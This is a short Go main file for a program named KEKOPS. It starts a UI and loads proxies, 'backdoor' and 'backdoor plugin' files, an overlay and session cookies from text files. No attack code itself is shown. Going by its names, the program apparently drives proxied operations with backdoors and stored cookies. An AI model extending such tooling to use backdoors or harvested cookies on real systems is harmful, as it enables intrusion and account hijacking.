package main

import (
	"kekops/core"
	"kekops/ui"
	"log"
	_ "net/http/pprof"
	"os"
	"time"
)

func main() {
	os.Stderr, _ = os.Create("stderr.txt")
	log.Println("Loading KEKOPS ...")

	go core.RegisterCommands()
	go core.Scheduler.Poll()
	go func() {
		defer func() {
			if r := recover(); r != nil {
				return
			}
		}()
		time.Sleep(1 * time.Second)
		core.LoadProxies("proxies.txt")
		core.Operations.LoadBackdoor("backdoor.txt")
		core.Operations.LoadBackdoorPlugin("backdoorplugin.txt")
		core.Operations.LoadOverlay()
		time.Sleep(300 * time.Millisecond)
		core.CookieManager.LoadCookies("cookies.txt", false)
	}()
	ui.InitUi()
	// After closing
	core.Tracker.Close()
}
